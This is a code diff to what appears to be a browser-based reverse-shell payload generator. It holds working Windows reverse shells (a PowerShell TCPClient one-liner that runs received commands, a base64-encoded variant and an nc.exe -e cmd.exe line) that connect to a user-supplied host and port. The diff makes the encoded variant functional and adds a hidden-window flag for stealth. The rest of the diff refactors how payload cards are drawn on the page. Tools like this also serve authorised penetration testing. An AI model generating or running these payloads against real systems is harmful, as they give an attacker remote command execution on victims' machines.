@@ -80,7 +80,17 @@ const PAYLOADS = {
     {name: "PowerShell (One-Liner)", fn: (h,p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`},
     {name: "PowerShell (Base64)", fn: (h,p) => {
       const cmd = `$client = New-Object System.Net.Sockets.TCPClient("${h}",${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
-      return `powershell -nop -enc [Base64 encode the above PowerShell command]\n\n# Command to encode:\n${cmd}`;
+      // Encode as UTF-16LE base64 (PowerShell -EncodedCommand expects this)
+      const utf16le = new Uint8Array(cmd.length * 2);
+      for (let i = 0; i < cmd.length; i++) {
+        const code = cmd.charCodeAt(i);
+        utf16le[i * 2] = code & 0xff;
+        utf16le[i * 2 + 1] = (code >> 8) & 0xff;
+      }
+      let binary = '';
+      utf16le.forEach(b => binary += String.fromCharCode(b));
+      const b64 = btoa(binary);
+      return `powershell -nop -w hidden -enc ${b64}`;
     }},
     {name: "Windows Netcat (nc.exe)", fn: (h,p) => `nc.exe -e cmd.exe ${h} ${p}`},
   ],
@@ -109,24 +119,35 @@ function renderPayloads() {
     container.innerHTML = '';
     PAYLOADS[cat].forEach((payload, idx) => {
       const code = payload.fn(h, p, s);
+      const payloadId = cat + '-' + idx;
       const card = document.createElement('div');
       card.className = 'payload-card';
-      card.innerHTML = `
-        <div class="payload-card-header">
-          <span class="lang">${payload.name}</span>
-          <button class="copy-btn" onclick="copyPayload(this, '${cat}-${idx}')">📋 Copy</button>
-        </div>
-        <div class="payload-code" id="payload-${cat}-${idx}">${escapeHtml(code)}</div>
-      `;
+
+      const header = document.createElement('div');
+      header.className = 'payload-card-header';
+
+      const langSpan = document.createElement('span');
+      langSpan.className = 'lang';
+      langSpan.textContent = payload.name;
+
+      const copyBtn = document.createElement('button');
+      copyBtn.className = 'copy-btn';
+      copyBtn.textContent = '📋 Copy';
+      copyBtn.addEventListener('click', function() { copyPayload(this, payloadId); });
+
+      header.appendChild(langSpan);
+      header.appendChild(copyBtn);
+
+      const codeDiv = document.createElement('div');
+      codeDiv.className = 'payload-code';
+      codeDiv.id = 'payload-' + payloadId;
+      codeDiv.textContent = code;
+
+      card.appendChild(header);
+      card.appendChild(codeDiv);
       container.appendChild(card);
     });
   });
-}
-
-function escapeHtml(text) {
-  const div = document.createElement('div');
-  div.appendChild(document.createTextNode(text));
-  return div.innerHTML;
 }
 
 function copyPayload(btn, id) {
